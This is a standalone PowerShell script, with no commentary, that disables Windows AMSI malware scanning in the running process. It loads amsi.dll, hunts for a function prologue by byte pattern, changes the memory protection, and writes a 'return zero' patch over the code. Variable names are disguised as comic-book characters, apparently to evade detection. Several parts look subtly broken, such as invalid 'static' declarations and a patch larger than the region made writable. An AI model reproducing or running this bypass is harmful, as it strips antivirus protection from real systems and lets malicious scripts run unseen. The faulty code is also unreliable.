Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}




function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $thor,
        [Parameter(Position = 1, Mandatory = $True)] [String] $captain
    )

    # Get a reference to System.dll in the GAC
    $tony = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $shield = $tony.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $hammer = $shield.GetMethod('GetModuleHandle')
    $bucket = $shield.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $odin = $hammer.Invoke($null, @($thor))
    $peter = New-Object IntPtr
    $parker = New-Object System.Runtime.InteropServices.HandleRef($peter, $odin)
    # Return the address of the function using the Hunter class
    $quill = [System.Text.Encoding]::ASCII.GetBytes($captain)
    return [Hunter]::FindAddress([IntPtr]$parker, $quill)
}




function Get-DelegateType
{
    # Use parameter default values
    [OutputType([Type])]
    [Parameter(Position = 0)]
    [Type[]]
    $Parameters = (New-Object Type[](0)),
    
    [Parameter(Position = 1)]
    [Type]
    $ReturnType = [Void]

    # Use a cached assembly
    static $assemblyBuilder
    if (-not $assemblyBuilder) {
        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )
    }
    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

    # Use a cached delegate type
    static $delegateType
    if (-not $delegateType) {
        $typeBuilder = $moduleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $constructorBuilder = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $constructorBuilder.SetImplementationFlags('Runtime, Managed')
        $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $methodBuilder.SetImplementationFlags('Runtime, Managed')
        $delegateType = $typeBuilder.CreateType()
    }

    Write-Output $delegateType
}


$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
$VistualProtectDelegate =  Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)


If ([IntPtr]::Size -eq 8) {
    Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
    Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}


$hModule = $LoadLibrary.Invoke("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"
$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, "DllGetClassObject")
Write-Host "[+] DllGetClassObject address: $DllGetClassObjectAddress"
[IntPtr]$targetedAddress = [Hunter]::FindAddress($DllGetClassObjectAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"

$oldProtectionBuffer = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
